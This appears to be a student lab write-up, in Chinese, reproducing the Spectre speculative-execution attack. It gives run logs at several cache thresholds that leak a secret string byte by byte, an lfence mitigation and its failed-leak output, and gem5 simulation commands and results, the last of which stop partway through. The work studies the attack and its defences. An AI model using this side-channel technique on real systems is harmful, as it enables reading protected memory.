# Reproduce of Spectre

参考文献：[^1] [^2] [^3]

## environment

电脑的cache基本状况：

```bash
$ getconf -a | grep CACHE  
LEVEL1_ICACHE_SIZE                 32768
LEVEL1_ICACHE_ASSOC                8
LEVEL1_ICACHE_LINESIZE             64
LEVEL1_DCACHE_SIZE                 32768
LEVEL1_DCACHE_ASSOC                8
LEVEL1_DCACHE_LINESIZE             64
LEVEL2_CACHE_SIZE                  262144
LEVEL2_CACHE_ASSOC                 4
LEVEL2_CACHE_LINESIZE              64
LEVEL3_CACHE_SIZE                  8388608
LEVEL3_CACHE_ASSOC                 16
LEVEL3_CACHE_LINESIZE              64
LEVEL4_CACHE_SIZE                  0
LEVEL4_CACHE_ASSOC                 0
LEVEL4_CACHE_LINESIZE              0
```

## naive

分别令`cache_hit_threshold`为160,80,40,20，测试结果如下：

```bash
$ ./spectre.out 160
Using a cache hit threshold of 160.
Build: RDTSCP_SUPPORTED MFENCE_SUPPORTED CLFLUSH_SUPPORTED INTEL_MITIGATION_DISABLED LINUX_KERNEL_MITIGATION_DISABLED 
Reading 40 bytes:
Reading at malicious_x = 0xffffffffffffdfe8... Unclear: 0x54='T' score=992 (second best: 0x01='?' score=623)
Reading at malicious_x = 0xffffffffffffdfe9... Success: 0x68='h' score=2 
Reading at malicious_x = 0xffffffffffffdfea... Unclear: 0x65='e' score=989 (second best: 0x01='?' score=659)
Reading at malicious_x = 0xffffffffffffdfeb... Unclear: 0x20=' ' score=995 (second best: 0x01='?' score=625)
Reading at malicious_x = 0xffffffffffffdfec... Success: 0x4D='M' score=23 (second best: 0x01='?' score=9)
Reading at malicious_x = 0xffffffffffffdfed... Success: 0x61='a' score=2 
Reading at malicious_x = 0xffffffffffffdfee... Success: 0x67='g' score=13 (second best: 0x01='?' score=4)
Reading at malicious_x = 0xffffffffffffdfef... Unclear: 0x69='i' score=998 (second best: 0x01='?' score=627)
Reading at malicious_x = 0xffffffffffffdff0... Unclear: 0x63='c' score=995 (second best: 0x01='?' score=717)
Reading at malicious_x = 0xffffffffffffdff1... Unclear: 0x20=' ' score=994 (second best: 0x01='?' score=643)
Reading at malicious_x = 0xffffffffffffdff2... Unclear: 0x57='W' score=990 (second best: 0x01='?' score=704)
Reading at malicious_x = 0xffffffffffffdff3... Unclear: 0x6F='o' score=990 (second best: 0x01='?' score=723)
Reading at malicious_x = 0xffffffffffffdff4... Unclear: 0x72='r' score=998 (second best: 0x01='?' score=630)
Reading at malicious_x = 0xffffffffffffdff5... Unclear: 0x64='d' score=993 (second best: 0x01='?' score=690)
Reading at malicious_x = 0xffffffffffffdff6... Unclear: 0x73='s' score=997 (second best: 0x01='?' score=649)
Reading at malicious_x = 0xffffffffffffdff7... Success: 0x20=' ' score=43 (second best: 0x01='?' score=19)
Reading at malicious_x = 0xffffffffffffdff8... Unclear: 0x61='a' score=994 (second best: 0x01='?' score=629)
Reading at malicious_x = 0xffffffffffffdff9... Unclear: 0x72='r' score=999 (second best: 0x01='?' score=672)
Reading at malicious_x = 0xffffffffffffdffa... Unclear: 0x65='e' score=992 (second best: 0x01='?' score=670)
Reading at malicious_x = 0xffffffffffffdffb... Unclear: 0x20=' ' score=996 (second best: 0x01='?' score=634)
Reading at malicious_x = 0xffffffffffffdffc... Unclear: 0x53='S' score=996 (second best: 0x01='?' score=640)
Reading at malicious_x = 0xffffffffffffdffd... Success: 0x71='q' score=2 
Reading at malicious_x = 0xffffffffffffdffe... Success: 0x75='u' score=11 (second best: 0x01='?' score=3)
Reading at malicious_x = 0xffffffffffffdfff... Success: 0x65='e' score=11 (second best: 0x01='?' score=3)
Reading at malicious_x = 0xffffffffffffe000... Unclear: 0x61='a' score=997 (second best: 0x01='?' score=671)
Reading at malicious_x = 0xffffffffffffe001... Success: 0x6D='m' score=49 (second best: 0x01='?' score=22)
Reading at malicious_x = 0xffffffffffffe002... Success: 0x69='i' score=2 
Reading at malicious_x = 0xffffffffffffe003... Unclear: 0x73='s' score=996 (second best: 0x01='?' score=648)
Reading at malicious_x = 0xffffffffffffe004... Unclear: 0x68='h' score=996 (second best: 0x01='?' score=641)
Reading at malicious_x = 0xffffffffffffe005... Unclear: 0x20=' ' score=995 (second best: 0x01='?' score=680)
Reading at malicious_x = 0xffffffffffffe006... Unclear: 0x4F='O' score=985 (second best: 0x01='?' score=696)
Reading at malicious_x = 0xffffffffffffe007... Unclear: 0x73='s' score=997 (second best: 0x01='?' score=681)
Reading at malicious_x = 0xffffffffffffe008... Unclear: 0x73='s' score=997 (second best: 0x01='?' score=680)
Reading at malicious_x = 0xffffffffffffe009... Success: 0x69='i' score=31 (second best: 0x01='?' score=13)
Reading at malicious_x = 0xffffffffffffe00a... Unclear: 0x66='f' score=987 (second best: 0x01='?' score=604)
Reading at malicious_x = 0xffffffffffffe00b... Unclear: 0x72='r' score=999 (second best: 0x01='?' score=656)
Reading at malicious_x = 0xffffffffffffe00c... Unclear: 0x61='a' score=996 (second best: 0x01='?' score=656)
Reading at malicious_x = 0xffffffffffffe00d... Unclear: 0x67='g' score=998 (second best: 0x01='?' score=640)
Reading at malicious_x = 0xffffffffffffe00e... Unclear: 0x65='e' score=993 (second best: 0x01='?' score=669)
Reading at malicious_x = 0xffffffffffffe00f... Unclear: 0x2E='.' score=991 (second best: 0x01='?' score=601)
```

```bash
$ ./spectre.out   
Using a cache hit threshold of 80.
Build: RDTSCP_SUPPORTED MFENCE_SUPPORTED CLFLUSH_SUPPORTED INTEL_MITIGATION_DISABLED LINUX_KERNEL_MITIGATION_DISABLED 
Reading 40 bytes:
Reading at malicious_x = 0xffffffffffffdfe8... Unclear: 0x54='T' score=997 (second best: 0x01='?' score=698)
Reading at malicious_x = 0xffffffffffffdfe9... Unclear: 0x68='h' score=998 (second best: 0x01='?' score=671)
Reading at malicious_x = 0xffffffffffffdfea... Unclear: 0x65='e' score=995 (second best: 0x01='?' score=724)
Reading at malicious_x = 0xffffffffffffdfeb... Unclear: 0x20=' ' score=996 (second best: 0x01='?' score=731)
Reading at malicious_x = 0xffffffffffffdfec... Unclear: 0x4D='M' score=996 (second best: 0x01='?' score=701)
Reading at malicious_x = 0xffffffffffffdfed... Unclear: 0x61='a' score=997 (second best: 0x01='?' score=741)
Reading at malicious_x = 0xffffffffffffdfee... Unclear: 0x67='g' score=999 (second best: 0x01='?' score=738)
Reading at malicious_x = 0xffffffffffffdfef... Unclear: 0x69='i' score=999 (second best: 0x01='?' score=775)
Reading at malicious_x = 0xffffffffffffdff0... Unclear: 0x63='c' score=998 (second best: 0x01='?' score=740)
Reading at malicious_x = 0xffffffffffffdff1... Unclear: 0x20=' ' score=997 (second best: 0x01='?' score=736)
Reading at malicious_x = 0xffffffffffffdff2... Unclear: 0x57='W' score=997 (second best: 0x01='?' score=760)
Reading at malicious_x = 0xffffffffffffdff3... Unclear: 0x6F='o' score=999 (second best: 0x01='?' score=737)
Reading at malicious_x = 0xffffffffffffdff4... Unclear: 0x72='r' score=999 (second best: 0x01='?' score=733)
Reading at malicious_x = 0xffffffffffffdff5... Unclear: 0x64='d' score=986 (second best: 0x01='?' score=675)
Reading at malicious_x = 0xffffffffffffdff6... Unclear: 0x73='s' score=999 (second best: 0x01='?' score=698)
Reading at malicious_x = 0xffffffffffffdff7... Unclear: 0x20=' ' score=990 (second best: 0x01='?' score=689)
Reading at malicious_x = 0xffffffffffffdff8... Unclear: 0x61='a' score=988 (second best: 0x00='?' score=561)
Reading at malicious_x = 0xffffffffffffdff9... Unclear: 0x72='r' score=997 (second best: 0x01='?' score=658)
Reading at malicious_x = 0xffffffffffffdffa... Unclear: 0x65='e' score=987 (second best: 0x01='?' score=667)
Reading at malicious_x = 0xffffffffffffdffb... Success: 0x20=' ' score=33 (second best: 0x01='?' score=14)
Reading at malicious_x = 0xffffffffffffdffc... Success: 0x53='S' score=2 
Reading at malicious_x = 0xffffffffffffdffd... Unclear: 0x71='q' score=972 (second best: 0x01='?' score=603)
Reading at malicious_x = 0xffffffffffffdffe... Success: 0x75='u' score=25 (second best: 0x01='?' score=10)
Reading at malicious_x = 0xffffffffffffdfff... Success: 0x65='e' score=15 (second best: 0x01='?' score=5)
Reading at malicious_x = 0xffffffffffffe000... Success: 0x61='a' score=61 (second best: 0x00='?' score=28)
Reading at malicious_x = 0xffffffffffffe001... Success: 0x6D='m' score=2 
Reading at malicious_x = 0xffffffffffffe002... Success: 0x69='i' score=2 
Reading at malicious_x = 0xffffffffffffe003... Success: 0x73='s' score=2 
Reading at malicious_x = 0xffffffffffffe004... Success: 0x68='h' score=2 
Reading at malicious_x = 0xffffffffffffe005... Success: 0x20=' ' score=2 
Reading at malicious_x = 0xffffffffffffe006... Success: 0x4F='O' score=2 
Reading at malicious_x = 0xffffffffffffe007... Success: 0x73='s' score=17 (second best: 0x01='?' score=6)
Reading at malicious_x = 0xffffffffffffe008... Success: 0x73='s' score=41 (second best: 0x01='?' score=18)
Reading at malicious_x = 0xffffffffffffe009... Success: 0x69='i' score=59 (second best: 0x00='?' score=27)
Reading at malicious_x = 0xffffffffffffe00a... Unclear: 0x66='f' score=848 (second best: 0x01='?' score=492)
Reading at malicious_x = 0xffffffffffffe00b... Unclear: 0x72='r' score=998 (second best: 0x01='?' score=547)
Reading at malicious_x = 0xffffffffffffe00c... Unclear: 0x61='a' score=987 (second best: 0x01='?' score=629)
Reading at malicious_x = 0xffffffffffffe00d... Success: 0x67='g' score=55 (second best: 0x00='?' score=25)
Reading at malicious_x = 0xffffffffffffe00e... Unclear: 0x65='e' score=970 (second best: 0x01='?' score=698)
Reading at malicious_x = 0xffffffffffffe00f... Unclear: 0x2E='.' score=942 (second best: 0x01='?' score=667)
```

```bash
$ ./spectre.out 40
Using a cache hit threshold of 40.
Build: RDTSCP_SUPPORTED MFENCE_SUPPORTED CLFLUSH_SUPPORTED INTEL_MITIGATION_DISABLED LINUX_KERNEL_MITIGATION_DISABLED 
Reading 40 bytes:
Reading at malicious_x = 0xffffffffffffdfe8... Success: 0x54='T' score=71 (second best: 0x00='?' score=33)
Reading at malicious_x = 0xffffffffffffdfe9... Success: 0x68='h' score=151 (second best: 0x00='?' score=73)
Reading at malicious_x = 0xffffffffffffdfea... Success: 0x65='e' score=17 (second best: 0x00='?' score=6)
Reading at malicious_x = 0xffffffffffffdfeb... Success: 0x20=' ' score=17 (second best: 0x00='?' score=6)
Reading at malicious_x = 0xffffffffffffdfec... Success: 0x4D='M' score=21 (second best: 0x00='?' score=8)
Reading at malicious_x = 0xffffffffffffdfed... Success: 0x61='a' score=85 (second best: 0x00='?' score=40)
Reading at malicious_x = 0xffffffffffffdfee... Success: 0x67='g' score=35 (second best: 0x00='?' score=15)
Reading at malicious_x = 0xffffffffffffdfef... Success: 0x69='i' score=7 (second best: 0x00='?' score=1)
Reading at malicious_x = 0xffffffffffffdff0... Success: 0x63='c' score=307 (second best: 0x00='?' score=151)
Reading at malicious_x = 0xffffffffffffdff1... Success: 0x20=' ' score=15 (second best: 0x00='?' score=5)
Reading at malicious_x = 0xffffffffffffdff2... Success: 0x57='W' score=19 (second best: 0x00='?' score=7)
Reading at malicious_x = 0xffffffffffffdff3... Success: 0x6F='o' score=187 (second best: 0x00='?' score=91)
Reading at malicious_x = 0xffffffffffffdff4... Success: 0x72='r' score=2 
Reading at malicious_x = 0xffffffffffffdff5... Success: 0x64='d' score=405 (second best: 0x00='?' score=200)
Reading at malicious_x = 0xffffffffffffdff6... Success: 0x73='s' score=2 
Reading at malicious_x = 0xffffffffffffdff7... Success: 0x20=' ' score=17 (second best: 0x00='?' score=6)
Reading at malicious_x = 0xffffffffffffdff8... Success: 0x61='a' score=733 (second best: 0x00='?' score=364)
Reading at malicious_x = 0xffffffffffffdff9... Success: 0x72='r' score=9 (second best: 0x00='?' score=2)
Reading at malicious_x = 0xffffffffffffdffa... Success: 0x65='e' score=2 
Reading at malicious_x = 0xffffffffffffdffb... Success: 0x20=' ' score=51 (second best: 0x00='?' score=23)
Reading at malicious_x = 0xffffffffffffdffc... Success: 0x53='S' score=11 (second best: 0x00='?' score=3)
Reading at malicious_x = 0xffffffffffffdffd... Success: 0x71='q' score=671 (second best: 0x00='?' score=333)
Reading at malicious_x = 0xffffffffffffdffe... Success: 0x75='u' score=35 (second best: 0x00='?' score=15)
Reading at malicious_x = 0xffffffffffffdfff... Success: 0x65='e' score=51 (second best: 0x00='?' score=23)
Reading at malicious_x = 0xffffffffffffe000... Success: 0x61='a' score=161 (second best: 0x00='?' score=78)
Reading at malicious_x = 0xffffffffffffe001... Success: 0x6D='m' score=13 (second best: 0x00='?' score=4)
Reading at malicious_x = 0xffffffffffffe002... Success: 0x69='i' score=11 (second best: 0x00='?' score=3)
Reading at malicious_x = 0xffffffffffffe003... Success: 0x73='s' score=2 
Reading at malicious_x = 0xffffffffffffe004... Success: 0x68='h' score=2 
Reading at malicious_x = 0xffffffffffffe005... Success: 0x20=' ' score=83 (second best: 0x00='?' score=39)
Reading at malicious_x = 0xffffffffffffe006... Unclear: 0x4F='O' score=774 (second best: 0x00='?' score=429)
Reading at malicious_x = 0xffffffffffffe007... Success: 0x73='s' score=27 (second best: 0x00='?' score=11)
Reading at malicious_x = 0xffffffffffffe008... Success: 0x73='s' score=135 (second best: 0x00='?' score=65)
Reading at malicious_x = 0xffffffffffffe009... Success: 0x69='i' score=2 
Reading at malicious_x = 0xffffffffffffe00a... Success: 0x00='?' score=2 
Reading at malicious_x = 0xffffffffffffe00b... Success: 0x72='r' score=2 
Reading at malicious_x = 0xffffffffffffe00c... Success: 0x61='a' score=2 
Reading at malicious_x = 0xffffffffffffe00d... Success: 0x67='g' score=2 
Reading at malicious_x = 0xffffffffffffe00e... Success: 0x65='e' score=2 
Reading at malicious_x = 0xffffffffffffe00f... Success: 0x2E='.' score=39 (second best: 0x00='?' score=17)
```

```bash
$ ./spectre.out 20
Using a cache hit threshold of 20.
Build: RDTSCP_SUPPORTED MFENCE_SUPPORTED CLFLUSH_SUPPORTED INTEL_MITIGATION_DISABLED LINUX_KERNEL_MITIGATION_DISABLED 
Reading 40 bytes:
Reading at malicious_x = 0xffffffffffffdfe8... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdfe9... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdfea... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdfeb... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdfec... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdfed... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdfee... Success: 0x67='g' score=1 
Reading at malicious_x = 0xffffffffffffdfef... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdff0... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdff1... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdff2... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdff3... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdff4... Success: 0x72='r' score=2 
Reading at malicious_x = 0xffffffffffffdff5... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdff6... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdff7... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdff8... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdff9... Success: 0x72='r' score=1 
Reading at malicious_x = 0xffffffffffffdffa... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdffb... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdffc... Success: 0x53='S' score=1 
Reading at malicious_x = 0xffffffffffffdffd... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdffe... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffdfff... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffe000... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffe001... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffe002... Success: 0x69='i' score=1 
Reading at malicious_x = 0xffffffffffffe003... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffe004... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffe005... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffe006... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffe007... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffe008... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffe009... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffe00a... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffe00b... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffe00c... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffe00d... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffe00e... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xffffffffffffe00f... Success: 0xFF='?' score=0 
```

## software solution: with lfence

在间接分支前插入lfence指令可以确保分支前的流水线被清空，并且分支被快速解决。这反过来又减少了在分支中毒的情况下被投机性执行的指令数量。

```cpp
#ifdef INTEL_MITIGATION
    _mm_lfence();
#endif
```

```bash
$ ./spectre.out 80 
Version: commit a831aa85ad9ef74d4a6750c9cc2053d668753e22
Using a cache hit threshold of 80.
Build: RDTSCP_SUPPORTED MFENCE_SUPPORTED CLFLUSH_SUPPORTED INTEL_MITIGATION_ENABLED LINUX_KERNEL_MITIGATION_DISABLED 
Reading 40 bytes:
Reading at malicious_x = 0xffffffffffffdfe8... Unclear: 0x01='?' score=713 (second best: 0x00='?' score=528)
Reading at malicious_x = 0xffffffffffffdfe9... Unclear: 0x00='?' score=537 (second best: 0x01='?' score=444)
Reading at malicious_x = 0xffffffffffffdfea... Unclear: 0x01='?' score=674 (second best: 0x00='?' score=524)
Reading at malicious_x = 0xffffffffffffdfeb... Unclear: 0x01='?' score=595 (second best: 0x00='?' score=583)
Reading at malicious_x = 0xffffffffffffdfec... Unclear: 0x01='?' score=626 (second best: 0x00='?' score=543)
Reading at malicious_x = 0xffffffffffffdfed... Success: 0x00='?' score=2 
Reading at malicious_x = 0xffffffffffffdfee... Unclear: 0x01='?' score=727 (second best: 0x00='?' score=465)
Reading at malicious_x = 0xffffffffffffdfef... Unclear: 0x01='?' score=761 (second best: 0x00='?' score=502)
Reading at malicious_x = 0xffffffffffffdff0... Unclear: 0x01='?' score=721 (second best: 0x00='?' score=499)
Reading at malicious_x = 0xffffffffffffdff1... Success: 0x01='?' score=13 (second best: 0x00='?' score=4)
Reading at malicious_x = 0xffffffffffffdff2... Unclear: 0x00='?' score=623 (second best: 0x01='?' score=615)
Reading at malicious_x = 0xffffffffffffdff3... Unclear: 0x01='?' score=677 (second best: 0x00='?' score=519)
Reading at malicious_x = 0xffffffffffffdff4... Success: 0x01='?' score=15 (second best: 0x00='?' score=5)
Reading at malicious_x = 0xffffffffffffdff5... Success: 0x01='?' score=13 (second best: 0x00='?' score=4)
Reading at malicious_x = 0xffffffffffffdff6... Unclear: 0x01='?' score=746 (second best: 0x00='?' score=521)
Reading at malicious_x = 0xffffffffffffdff7... Unclear: 0x01='?' score=728 (second best: 0x00='?' score=523)
Reading at malicious_x = 0xffffffffffffdff8... Unclear: 0x01='?' score=629 (second best: 0x00='?' score=540)
Reading at malicious_x = 0xffffffffffffdff9... Unclear: 0x01='?' score=617 (second best: 0x00='?' score=613)
Reading at malicious_x = 0xffffffffffffdffa... Success: 0x01='?' score=31 (second best: 0x00='?' score=13)
Reading at malicious_x = 0xffffffffffffdffb... Unclear: 0x01='?' score=740 (second best: 0x00='?' score=513)
Reading at malicious_x = 0xffffffffffffdffc... Unclear: 0x01='?' score=711 (second best: 0x00='?' score=488)
Reading at malicious_x = 0xffffffffffffdffd... Unclear: 0x01='?' score=588 (second best: 0x00='?' score=564)
Reading at malicious_x = 0xffffffffffffdffe... Unclear: 0x00='?' score=524 (second best: 0x01='?' score=505)
Reading at malicious_x = 0xffffffffffffdfff... Unclear: 0x01='?' score=723 (second best: 0x00='?' score=523)
Reading at malicious_x = 0xffffffffffffe000... Unclear: 0x01='?' score=713 (second best: 0x00='?' score=518)
Reading at malicious_x = 0xffffffffffffe001... Unclear: 0x01='?' score=617 (second best: 0x00='?' score=522)
Reading at malicious_x = 0xffffffffffffe002... Success: 0x01='?' score=2 
Reading at malicious_x = 0xffffffffffffe003... Unclear: 0x01='?' score=692 (second best: 0x00='?' score=593)
Reading at malicious_x = 0xffffffffffffe004... Success: 0x01='?' score=13 (second best: 0x00='?' score=4)
Reading at malicious_x = 0xffffffffffffe005... Unclear: 0x01='?' score=712 (second best: 0x00='?' score=516)
Reading at malicious_x = 0xffffffffffffe006... Unclear: 0x01='?' score=758 (second best: 0x00='?' score=460)
Reading at malicious_x = 0xffffffffffffe007... Unclear: 0x01='?' score=767 (second best: 0x00='?' score=528)
Reading at malicious_x = 0xffffffffffffe008... Unclear: 0x00='?' score=614 (second best: 0x01='?' score=601)
Reading at malicious_x = 0xffffffffffffe009... Unclear: 0x01='?' score=644 (second best: 0x00='?' score=498)
Reading at malicious_x = 0xffffffffffffe00a... Unclear: 0x01='?' score=730 (second best: 0x00='?' score=509)
Reading at malicious_x = 0xffffffffffffe00b... Unclear: 0x01='?' score=742 (second best: 0x00='?' score=512)
Reading at malicious_x = 0xffffffffffffe00c... Unclear: 0x01='?' score=649 (second best: 0x00='?' score=587)
Reading at malicious_x = 0xffffffffffffe00d... Unclear: 0x01='?' score=608 (second best: 0x00='?' score=588)
Reading at malicious_x = 0xffffffffffffe00e... Unclear: 0x01='?' score=730 (second best: 0x00='?' score=539)
Reading at malicious_x = 0xffffffffffffe00f... Unclear: 0x01='?' score=729 (second best: 0x00='?' score=464)
```

不过原文也指出了这样做的问题：这样做虽然确保后面的指令不被投机执行，但这事实上禁用了分支预测，大大降低了性能。

## hardware solution: change branch prediction

由于gem5的仿真速度较慢，将try times从1000改为50。在本机直接运行的结果如下：

```bash
$ ./labs/SpectrePoC/spectre.out
Using a cache hit threshold of 80.
Build: RDTSCP_SUPPORTED MFENCE_SUPPORTED CLFLUSH_SUPPORTED INTEL_MITIGATION_DISABLED LINUX_KERNEL_MITIGATION_DISABLED 
Reading 40 bytes:
Reading at malicious_x = 0xfffffffffffd3f08... Success: 0x54='T' score=2 
Reading at malicious_x = 0xfffffffffffd3f09... Success: 0x68='h' score=2 
Reading at malicious_x = 0xfffffffffffd3f0a... Success: 0x65='e' score=2 
Reading at malicious_x = 0xfffffffffffd3f0b... Success: 0x20=' ' score=2 
Reading at malicious_x = 0xfffffffffffd3f0c... Success: 0x4D='M' score=2 
Reading at malicious_x = 0xfffffffffffd3f0d... Success: 0x61='a' score=2 
Reading at malicious_x = 0xfffffffffffd3f0e... Success: 0x67='g' score=2 
Reading at malicious_x = 0xfffffffffffd3f0f... Success: 0x69='i' score=2 
Reading at malicious_x = 0xfffffffffffd3f10... Success: 0x63='c' score=2 
Reading at malicious_x = 0xfffffffffffd3f11... Success: 0x20=' ' score=2 
Reading at malicious_x = 0xfffffffffffd3f12... Success: 0x57='W' score=2 
Reading at malicious_x = 0xfffffffffffd3f13... Success: 0x6F='o' score=2 
Reading at malicious_x = 0xfffffffffffd3f14... Success: 0x72='r' score=2 
Reading at malicious_x = 0xfffffffffffd3f15... Success: 0x64='d' score=2 
Reading at malicious_x = 0xfffffffffffd3f16... Success: 0x73='s' score=2 
Reading at malicious_x = 0xfffffffffffd3f17... Success: 0x20=' ' score=2 
Reading at malicious_x = 0xfffffffffffd3f18... Success: 0x61='a' score=2 
Reading at malicious_x = 0xfffffffffffd3f19... Success: 0x72='r' score=2 
Reading at malicious_x = 0xfffffffffffd3f1a... Success: 0x65='e' score=2 
Reading at malicious_x = 0xfffffffffffd3f1b... Success: 0x20=' ' score=2 
Reading at malicious_x = 0xfffffffffffd3f1c... Success: 0x53='S' score=2 
Reading at malicious_x = 0xfffffffffffd3f1d... Success: 0x71='q' score=2 
Reading at malicious_x = 0xfffffffffffd3f1e... Success: 0x75='u' score=2 
Reading at malicious_x = 0xfffffffffffd3f1f... Success: 0x65='e' score=2 
Reading at malicious_x = 0xfffffffffffd3f20... Success: 0x61='a' score=2 
Reading at malicious_x = 0xfffffffffffd3f21... Success: 0x6D='m' score=2 
Reading at malicious_x = 0xfffffffffffd3f22... Success: 0x69='i' score=2 
Reading at malicious_x = 0xfffffffffffd3f23... Success: 0x73='s' score=2 
Reading at malicious_x = 0xfffffffffffd3f24... Success: 0x68='h' score=2 
Reading at malicious_x = 0xfffffffffffd3f25... Success: 0x20=' ' score=2 
Reading at malicious_x = 0xfffffffffffd3f26... Success: 0x4F='O' score=2 
Reading at malicious_x = 0xfffffffffffd3f27... Success: 0x73='s' score=2 
Reading at malicious_x = 0xfffffffffffd3f28... Success: 0x73='s' score=2 
Reading at malicious_x = 0xfffffffffffd3f29... Success: 0x69='i' score=2 
Reading at malicious_x = 0xfffffffffffd3f2a... Success: 0x66='f' score=2 
Reading at malicious_x = 0xfffffffffffd3f2b... Success: 0x72='r' score=2 
Reading at malicious_x = 0xfffffffffffd3f2c... Success: 0x61='a' score=2 
Reading at malicious_x = 0xfffffffffffd3f2d... Success: 0x67='g' score=2 
Reading at malicious_x = 0xfffffffffffd3f2e... Success: 0x65='e' score=2 
Reading at malicious_x = 0xfffffffffffd3f2f... Success: 0x2E='.' score=2 
```

首先看gem5中的分支预测器设置：

```bash
$ build/X86/gem5.debug configs/example/se.py --list-bp-types

Available BranchPredictor classes:
        BiModeBP
        LTAGE
        LocalBP
        MultiperspectivePerceptron64KB
        MultiperspectivePerceptron8KB
        MultiperspectivePerceptronTAGE64KB
        MultiperspectivePerceptronTAGE8KB
        TAGE
        TAGE_SC_L_64KB
        TAGE_SC_L_8KB
        TournamentBP
```

```bash
$ build/X86/gem5.debug configs/example/se.py --list-indirect-bp-types    

Available IndirectPredictor classes:
        SimpleIndirectPredictor
```

参考文献中指定的CPU型号及其分支预测器为`DerivO3CPU(branchPred=LTAGE())`，因为可以更容易地检测到spectre。其他仿真参数与本机配置设置一致：

```bash
$ build/X86/gem5.debug configs/example/se.py -c ./labs/SpectrePoC/spectre.out --cpu-type=DerivO3CPU --caches --l2cache --l1d_size=32768 --l1i_size=32768 --l1d_assoc=8 --l1i_assoc=8 --l2_size=262144 --l2_assoc=4 --cacheline_size=64 --cpu-clock=2304.008MHz --sys-clock=2304.008MHz --num-cpus=8
```

结果如下：

```bash
Reading 40 bytes:
Reading at malicious_x = 0xfffffffffffd3f08... Success: 0x54='T' score=2 
Reading at malicious_x = 0xfffffffffffd3f09... Success: 0x68='h' score=1 
Reading at malicious_x = 0xfffffffffffd3f0a... Success: 0x65='e' score=2 
Reading at malicious_x = 0xfffffffffffd3f0b... Success: 0x20=' ' score=1 
Reading at malicious_x = 0xfffffffffffd3f0c... Success: 0x4D='M' score=1 
Reading at malicious_x = 0xfffffffffffd3f0d... Success: 0x61='a' score=2 
Reading at malicious_x = 0xfffffffffffd3f0e... Success: 0x67='g' score=1 
Reading at malicious_x = 0xfffffffffffd3f0f... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f10... Success: 0x63='c' score=1 
Reading at malicious_x = 0xfffffffffffd3f11... Success: 0x20=' ' score=1 
Reading at malicious_x = 0xfffffffffffd3f12... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f13... Success: 0x6F='o' score=1 
Reading at malicious_x = 0xfffffffffffd3f14... Success: 0x72='r' score=1 
Reading at malicious_x = 0xfffffffffffd3f15... Success: 0x64='d' score=1 
Reading at malicious_x = 0xfffffffffffd3f16... Success: 0x73='s' score=1 
Reading at malicious_x = 0xfffffffffffd3f17... Success: 0x20=' ' score=1 
Reading at malicious_x = 0xfffffffffffd3f18... Success: 0x61='a' score=1 
Reading at malicious_x = 0xfffffffffffd3f19... Success: 0x72='r' score=1 
Reading at malicious_x = 0xfffffffffffd3f1a... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f1b... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f1c... Success: 0x53='S' score=1 
Reading at malicious_x = 0xfffffffffffd3f1d... Success: 0x71='q' score=1 
Reading at malicious_x = 0xfffffffffffd3f1e... Success: 0x75='u' score=1 
Reading at malicious_x = 0xfffffffffffd3f1f... Success: 0x65='e' score=1 
Reading at malicious_x = 0xfffffffffffd3f20... Success: 0x61='a' score=1 
Reading at malicious_x = 0xfffffffffffd3f21... Success: 0x6D='m' score=1 
Reading at malicious_x = 0xfffffffffffd3f22... Success: 0x69='i' score=1 
Reading at malicious_x = 0xfffffffffffd3f23... Success: 0x73='s' score=1 
Reading at malicious_x = 0xfffffffffffd3f24... Success: 0x68='h' score=1 
Reading at malicious_x = 0xfffffffffffd3f25... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f26... Success: 0x4F='O' score=1 
Reading at malicious_x = 0xfffffffffffd3f27... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f28... Success: 0x73='s' score=1 
Reading at malicious_x = 0xfffffffffffd3f29... Success: 0x69='i' score=1 
Reading at malicious_x = 0xfffffffffffd3f2a... Success: 0x66='f' score=2 
Reading at malicious_x = 0xfffffffffffd3f2b... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f2c... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f2d... Success: 0x67='g' score=1 
